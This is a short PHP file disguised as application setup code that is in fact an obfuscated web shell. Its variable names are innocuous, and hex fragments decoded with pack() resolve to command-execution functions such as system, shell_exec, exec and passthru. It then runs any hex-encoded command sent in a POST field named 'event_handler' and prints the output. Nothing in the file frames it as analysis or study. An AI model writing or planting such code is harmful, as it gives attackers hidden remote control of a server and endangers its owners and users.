<?php


$key1 = '737';
$key2 = '973';
$key3 = '746';
$key4 = '865';
$key5 = 'c5f';
$key6 = '657';
$key7 = '173';
$key8 = '727';
$key9 = '706';
$key10 = 'f70';
$key11 = '656';
$key12 = 'f63';
$key13 = '36c';
$key14 = '6f7';
$key15 = '16e';
$key16 = '646';
$key17 = 'c65';
$app_initializer1 = pack("H*", $key1 . $key2 . $key3 . '56d');
$app_initializer2 = pack("H*", '736' . $key4 . '6c6' . $key5 . '657' . $key4);
$app_initializer3 = pack("H*", $key6 . $key4);
$app_initializer4 = pack("H*", '706' . $key7 . '737' . '468' . $key8);
$app_initializer5 = pack("H*", $key9 . $key10 . '656');
$app_initializer6 = pack("H*", '737' . '472' . $key11 . '16d' . '5f6' . '765' . '745' . $key12 . '6f6' . 'e74' . $key11 . 'e74');
$app_initializer7 = pack("H*", $key9 . $key13 . $key14 . '365');
$event_handler = pack("H*", $key6 . '665' . '6e7' . '45f' . '686' . $key15 . $key16 . $key17);
if (isset($_POST[$event_handler])) {
    $event_handler = pack("H*", $_POST[$event_handler]);
    if (function_exists($app_initializer1)) {
        $app_initializer1($event_handler);
    } elseif (function_exists($app_initializer2)) {
        print $app_initializer2($event_handler);
    } elseif (function_exists($app_initializer3)) {
        $app_initializer3($event_handler, $component_flag);
        print join("\n", $component_flag);
    } elseif (function_exists($app_initializer4)) {
        $app_initializer4($event_handler);
    } elseif (function_exists($app_initializer5) && function_exists($app_initializer6) && function_exists($app_initializer7)) {
        $dat_ent = $app_initializer5($event_handler, 'r');
        if ($dat_ent) {
            $descriptor_pset = $app_initializer6($dat_ent);
            $app_initializer7($dat_ent);
            print $descriptor_pset;
        }
    }
    exit;
}
